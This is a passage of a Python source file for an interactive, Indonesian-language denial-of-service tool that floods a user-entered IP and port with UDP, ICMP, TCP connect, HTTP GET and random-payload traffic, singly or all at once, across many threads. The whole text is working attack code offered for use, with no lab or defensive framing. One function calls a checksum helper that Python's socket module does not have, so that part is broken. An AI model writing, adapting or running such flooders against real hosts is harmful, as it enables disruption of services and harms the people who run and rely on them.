    print(f"  {ART}[06]{TXT} Multi-Protocol      {LINE}semua mode jalan bareng sekaligus{Style.RESET_ALL}")
    print(f"  {ART}[07]{TXT} Custom Packet       {LINE}payload acak UDP+TCP campur{Style.RESET_ALL}")
    print(f"  {ART}[00]{TXT} Exit{Style.RESET_ALL}\n")
    try:
        pilih = input(f"  {Fore.GREEN}[x]{TXT} select option : {Style.RESET_ALL}").strip()
    except (KeyboardInterrupt, EOFError):
        print(f"\n  {Fore.RED}bye bangsat.{Style.RESET_ALL}")
        sys.exit()
    if pilih.lower() in ("exit", "keluar", "q"):
        sys.exit()
    return pilih.zfill(2)

def _display_loop(label, counter, done_event):
    global stop_flag
    try:
        while not done_event.is_set():
            time.sleep(0.3)
            with lock:
                current = counter[0]
            sys.stdout.write(f"\r  {TXT}[*] {label}: {Fore.GREEN}{current}{TXT} | CTRL+C buat stop   ")
            sys.stdout.flush()
    except KeyboardInterrupt:
        stop_flag = True
    with lock:
        return counter[0]

def udp_flood(target_ip, port, num_threads=20):
    global stop_flag, packet_count
    print(f"\n  {Fore.GREEN}[!] UDP Flood dimulai ke {target_ip}:{port}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}[!] Threads: {num_threads} | CTRL+C buat stop{Style.RESET_ALL}\n")
    counter = [0]
    done = threading.Event()
    def worker():
        data = bytes(random._urandom(1024))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        local = 0
        while not stop_flag:
            try:
                sock.sendto(data, (target_ip, port))
                local += 1
                if local % 50 == 0:
                    with lock: counter[0] += 50
            except: pass
        with lock: counter[0] += local % 50
        sock.close()
    threads = [threading.Thread(target=worker, daemon=True) for _ in range(num_threads)]
    for t in threads: t.start()
    final = _display_loop("Packets", counter, done)
    done.set()
    for t in threads: t.join(timeout=2)
    packet_count = final
    print(f"\n  {Fore.GREEN}[✓] Selesai. Total: {final} packets{Style.RESET_ALL}")

def icmp_flood(target_ip, num_threads=10):
    global stop_flag, packet_count
    print(f"\n  {Fore.GREEN}[!] ICMP Flood dimulai ke {target_ip}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}[!] Threads: {num_threads} | CTRL+C buat stop{Style.RESET_ALL}\n")
    counter = [0]
    done = threading.Event()
    def worker():
        local = 0
        while not stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                header = struct.pack('!BBHHH', 8, 0, 0, 1, 1)
                data = bytes(random._urandom(64))
                checksum = socket.inetchecksum(header + data)
                header = struct.pack('!BBHHH', 8, 0, checksum, 1, 1)
                sock.sendto(header + data, (target_ip, 0))
                sock.close()
                local += 1
                if local % 200 == 0:
                    with lock: counter[0] += 200
            except PermissionError:
                print(f"\n  {Fore.RED}[X] Butuh admin/root buat raw socket!{Style.RESET_ALL}")
                return
            except: pass
        with lock: counter[0] += local % 200
    threads = [threading.Thread(target=worker, daemon=True) for _ in range(num_threads)]
    for t in threads: t.start()
    final = _display_loop("ICMP", counter, done)
    done.set()
    for t in threads: t.join(timeout=2)
    packet_count = final
    print(f"\n  {Fore.GREEN}[✓] Selesai. Total: {final} packets{Style.RESET_ALL}")

def tcp_syn_flood(target_ip, port, num_threads=20):
    global stop_flag, packet_count
    print(f"\n  {Fore.GREEN}[!] TCP SYN Flood dimulai ke {target_ip}:{port}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}[!] Threads: {num_threads} | CTRL+C buat stop{Style.RESET_ALL}\n")
    counter = [0]
    done = threading.Event()
    def worker():
        local = 0
        while not stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect_ex((target_ip, port))
                sock.close()
                local += 1
                if local % 200 == 0:
                    with lock: counter[0] += 200
            except: pass
        with lock: counter[0] += local % 200
    threads = [threading.Thread(target=worker, daemon=True) for _ in range(num_threads)]
    for t in threads: t.start()
    final = _display_loop("SYN", counter, done)
    done.set()
    for t in threads: t.join(timeout=2)
    packet_count = final
    print(f"\n  {Fore.GREEN}[✓] Selesai. Total: {final} packets{Style.RESET_ALL}")

def http_flood(target_ip, port, num_threads=20):
    global stop_flag, packet_count
    print(f"\n  {Fore.GREEN}[!] HTTP Flood dimulai ke {target_ip}:{port}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}[!] Threads: {num_threads} | CTRL+C buat stop{Style.RESET_ALL}\n")
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
        "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0",
        "curl/8.5.0", "python-requests/2.31.0",
    ]
    counter = [0]
    done = threading.Event()
    def worker():
        local = 0
        while not stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, port))
                ua = random.choice(user_agents)
                req = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n"
                sock.send(req.encode())
                sock.close()
                local += 1
                if local % 200 == 0:
                    with lock: counter[0] += 200
            except: pass
        with lock: counter[0] += local % 200
    threads = [threading.Thread(target=worker, daemon=True) for _ in range(num_threads)]
    for t in threads: t.start()
    final = _display_loop("HTTP", counter, done)
    done.set()
    for t in threads: t.join(timeout=2)
    packet_count = final
    print(f"\n  {Fore.GREEN}[✓] Selesai. Total: {final} requests{Style.RESET_ALL}")

def multi_flood(target_ip, port, num_threads=20):
    global stop_flag, packet_count
    print(f"\n  {Fore.GREEN}[!] Multi-Protocol Flood dimulai ke {target_ip}:{port}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}[!] {num_threads} threads per protocol | CTRL+C buat stop{Style.RESET_ALL}\n")
    t1 = threading.Thread(target=udp_flood, args=(target_ip, port, num_threads), daemon=True)
    t2 = threading.Thread(target=icmp_flood, args=(target_ip, num_threads), daemon=True)
    t3 = threading.Thread(target=tcp_syn_flood, args=(target_ip, port, num_threads), daemon=True)
    t4 = threading.Thread(target=http_flood, args=(target_ip, port, num_threads), daemon=True)
    for t in [t1, t2, t3, t4]: t.start()
    try:
        while not stop_flag: time.sleep(0.5)
    except KeyboardInterrupt:
        stop_flag = True
    for t in [t1, t2, t3, t4]: t.join(timeout=2)
    print(f"\n  {Fore.GREEN}[✓] Selesai. Total: {packet_count} packets{Style.RESET_ALL}")

def custom_flood(target_ip, port, num_threads=20):
    global stop_flag, packet_count
    print(f"\n  {Fore.GREEN}[!] Custom Packet Flood dimulai ke {target_ip}:{port}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}[!] {num_threads} threads | Random payload | CTRL+C buat stop{Style.RESET_ALL}\n")
    counter = [0]
    done = threading.Event()
    def worker():
        local = 0
        while not stop_flag:
            try:
                data = bytes(random._urandom(random.randint(64, 1400)))
                if random.choice(["udp", "tcp"]) == "udp":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(data, (target_ip, port))
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect_ex((target_ip, port))
                    sock.send(data)
                sock.close()
                local += 1
                if local % 200 == 0:
                    with lock: counter[0] += 200
            except: pass
        with lock: counter[0] += local % 200
    threads = [threading.Thread(target=worker, daemon=True) for _ in range(num_threads)]
    for t in threads: t.start()
    final = _display_loop("Custom", counter, done)
    done.set()
    for t in threads: t.join(timeout=2)
    packet_count = final
    print(f"\n  {Fore.GREEN}[✓] Selesai. Total: {final} packets{Style.RESET_ALL}")

def get_target():
    print(f"  {TXT}Masukkan IP target:{Style.RESET_ALL}")
    try:
        ip = input(f"  {Fore.GREEN}[x]{TXT} target : {Style.RESET_ALL}").strip()
    except (KeyboardInterrupt, EOFError):
        return None
    try:
        socket.inet_aton(ip)
        return ip
    except socket.error:
        print(f"  {Fore.RED}[X] IP nggak valid bangsat!{Style.RESET_ALL}")
        return None

def get_port():
    print(f"  {TXT}Masukkan port (default 80):{Style.RESET_ALL}")
    try:
        port = input(f"  {Fore.GREEN}[x]{TXT} port : {Style.RESET_ALL}").strip()
    except (KeyboardInterrupt, EOFError):
        return 80
    if not port: return 80
    try:
        port = int(port)
        if 1 <= port <= 65535: return port
        print(f"  {Fore.RED}[X] Port harus 1-65535!{Style.RESET_ALL}")
    except ValueError:
        print(f"  {Fore.RED}[X] Port harus angka!{Style.RESET_ALL}")
    return 80

def get_threads():
    print(f"  {TXT}Jumlah threads (default 20, max 100):{Style.RESET_ALL}")
    try:
        t = input(f"  {Fore.GREEN}[x]{TXT} threads : {Style.RESET_ALL}").strip()
    except (KeyboardInterrupt, EOFError):
        return 20
    if not t: return 20
    try:
        t = int(t)
        if 1 <= t <= 100: return t
        print(f"  {Fore.RED}[X] Threads harus 1-100!{Style.RESET_ALL}")
    except ValueError:
        print(f"  {Fore.RED}[X] Threads harus angka!{Style.RESET_ALL}")
    return 20

def run_attack(mode, target_ip, port, num_threads):
    global stop_flag, packet_count
    stop_flag = False
    packet_count = 0
    print()
    if mode == "02": udp_flood(target_ip, port, num_threads)
    elif mode == "03": icmp_flood(target_ip, num_threads)
    elif mode == "04": tcp_syn_flood(target_ip, port, num_threads)
    elif mode == "05": http_flood(target_ip, port, num_threads)
    elif mode == "06": multi_flood(target_ip, port, num_threads)
    elif mode == "07": custom_flood(target_ip, port, num_threads)
    print(f"\n  {Fore.GREEN}[✓] Attack selesai!{Style.RESET_ALL}")
    print(f"  {TXT}Target : {Fore.GREEN}{target_ip}:{port}{Style.RESET_ALL}")
    print(f"  {TXT}Total  : {Fore.GREEN}{packet_count}{TXT} packets{Style.RESET_ALL}")

def main():
    while True:
        global stop_flag
        stop_flag = False
        banner()
        info_box()
        mode = menu()
        if mode in ("00", "exit", "keluar", "q"):
            print(f"\n  {Fore.GREEN}bye bangsat.{Style.RESET_ALL}")
            sys.exit()
        if mode not in ("01", "02", "03", "04", "05", "06", "07"):
            print(f"  {Fore.RED}[X] Pilihan nggak ada, coba lagi.{Style.RESET_ALL}")
            time.sleep(1.5)
            continue
        if mode == "01":
            scan_network()
            try:
                input(f"  {TXT}Tekan ENTER buat balik ke menu...{Style.RESET_ALL}")
            except (KeyboardInterrupt, EOFError): pass
            continue
        target_ip = get_target()
        if not target_ip:
            time.sleep(1.5)
            continue
        port = get_port()
        num_threads = get_threads()
        print(f"\n  {TXT}Target  : {Fore.GREEN}{target_ip}:{port}{Style.RESET_ALL}")
        print(f"  {TXT}Threads : {Fore.GREEN}{num_threads}{Style.RESET_ALL}")
        print(f"  {TXT}Mode    : {Fore.GREEN}{mode}{Style.RESET_ALL}")
        print(f"  {TXT}Tekan CTRL+C buat stop.{Style.RESET_ALL}")
        run_attack(mode, target_ip, port, num_threads)
        try:
            input(f"\n  {TXT}Tekan ENTER buat balik ke menu...{Style.RESET_ALL}")
        except (KeyboardInterrupt, EOFError): pass

if __name__ == "__main__":
    main()
